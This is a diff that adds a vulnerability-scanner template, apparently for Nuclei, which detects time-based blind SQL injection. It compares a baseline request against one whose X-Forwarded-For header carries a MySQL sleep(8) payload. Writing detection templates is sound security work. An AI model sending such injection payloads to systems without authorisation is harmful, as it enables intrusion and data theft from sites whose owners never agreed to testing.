@@ -1,0 +1,34 @@
+id: time-based-sqli
+
+info:
+  name: Time-Based Blind SQL Injection
+  author: omkar7505
+  severity: critical
+  description: |
+    Sends time-delay SQL payloads and measures response latency to confirm blind injection in various database engines, enabling data extraction without direct error messages.
+  tags: time-based-sqli,sqli,blind,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration<=7"
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: /*'+(select(0)from(select(sleep(8)))v)+'"*/
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=7 && duration <=16"
